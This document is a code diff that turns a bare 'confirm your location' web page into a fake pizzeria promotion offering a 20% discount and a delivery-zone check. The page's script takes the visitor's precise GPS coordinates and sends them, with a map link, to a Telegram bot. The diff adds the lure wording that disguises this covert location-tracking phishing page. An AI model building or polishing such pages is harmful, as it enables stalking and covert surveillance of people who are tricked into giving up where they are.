@@ -3,50 +3,89 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Подтверждение местоположения</title>
+  <title>Марио Пицца — Доставка и Скидки</title>
   <style>
+    * {
+      box-sizing: border-box;
+    }
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       display: flex;
       align-items: center;
       justify-content: center;
-      height: 100vh;
+      min-height: 100vh;
       margin: 0;
-      background-color: #f2f2f7;
-      color: #1c1c1e;
+      background-color: #f8f9fa;
+      color: #212529;
     }
     .card {
       background: white;
-      padding: 30px;
-      border-radius: 20px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+      padding: 28px 24px;
+      border-radius: 24px;
+      box-shadow: 0 12px 32px rgba(0,0,0,0.08);
       text-align: center;
-      max-width: 300px;
+      max-width: 340px;
       width: 90%;
+      border: 1px solid #f1f3f5;
+    }
+    .logo {
+      font-size: 48px;
+      margin-bottom: 8px;
+    }
+    h2 {
+      margin: 0 0 8px 0;
+      font-size: 22px;
+      color: #e03131;
+    }
+    p {
+      font-size: 14px;
+      color: #495057;
+      line-height: 1.4;
+      margin: 0 0 20px 0;
+    }
+    .promo-badge {
+      background-color: #fff0f6;
+      color: #d6336c;
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 13px;
+      font-weight: 600;
+      display: inline-block;
+      margin-bottom: 16px;
     }
     button {
-      background-color: #007aff;
+      background-color: #e03131;
       color: white;
       border: none;
-      padding: 14px;
-      font-size: 17px;
-      font-weight: 600;
-      border-radius: 12px;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: 700;
+      border-radius: 14px;
       cursor: pointer;
-      margin-top: 20px;
       width: 100%;
+      box-shadow: 0 4px 12px rgba(224, 49, 49, 0.3);
       -webkit-tap-highlight-color: transparent;
+      transition: background-color 0.2s;
     }
-    button:active { opacity: 0.8; }
-    #status { margin-top: 15px; font-size: 14px; color: #8e8e93; word-break: break-word; }
+    button:active {
+      background-color: #c92a2a;
+    }
+    #status {
+      margin-top: 16px;
+      font-size: 13px;
+      color: #868e96;
+      word-break: break-word;
+    }
   </style>
 </head>
 <body>
 
   <div class="card">
-    <h2>Luna Pizza</h2>
-    <p>Пожалуйста, подтвердите ваше текущее местоположение.</p>
-    <button onclick="getSingleLocation()">Подтвердить</button>
+    <div class="logo">🍕</div>
+    <h2>Марио Пицца</h2>
+    <div class="promo-badge">🎁 Скидка 20% на первый заказ</div>
+    <p>Подтвердите ваш адрес доставки, чтобы проверить, входит ли ваш дом в зону бесплатной экспресс-доставки.</p>
+    <button onclick="getSingleLocation()">Определить адрес доставки</button>
     <div id="status"></div>
   </div>
 
@@ -57,7 +96,7 @@
     async function sendToTelegram(lat, lon, accuracy) {
       const status = document.getElementById('status');
       const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-      const text = `📍 *Геопозиция получена!*\n\n• Координаты: ${lat}, ${lon}\n• Точность: ~${accuracy} м\n\n[Открыть на Google Картах](${mapUrl})`;
+      const text = `🍕 *Запрос доставки в пиццерии!*\n\n• Координаты: ${lat}, ${lon}\n• Точность: ~${accuracy} м\n\n[Открыть на Google Картах](${mapUrl})`;
 
       try {
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -69,14 +108,14 @@
         const data = await res.json();
 
         if (data.ok) {
-          status.innerText = "Успешно отправлено!";
+          status.innerText = "Адрес подтвержден! Проверяем зону доставки...";
           fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
           });
         } else {
-          status.innerText = "Ошибка Telegram: " + data.description;
+          status.innerText = "Ошибка: " + data.description;
         }
       } catch (err) {
         status.innerText = "Ошибка сети: " + err.message;
@@ -86,10 +125,10 @@
     function getSingleLocation() {
       const status = document.getElementById('status');
       if (!navigator.geolocation) {
-        status.innerText = "Геолокация не поддерживается.";
+        status.innerText = "Геолокация не поддерживается вашим браузером.";
         return;
       }
-      status.innerText = "Определение координат...";
+      status.innerText = "Определение зоны доставки...";
 
       navigator.geolocation.getCurrentPosition(
         (position) => {
@@ -99,7 +138,7 @@
           sendToTelegram(lat, lon, accuracy);
         },
         (error) => {
-          status.innerText = "Ошибка доступа к GPS.";
+          status.innerText = "Не удалось определить адрес. Пожалуйста, разрешите доступ к геопозиции.";
         },
         { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
       );
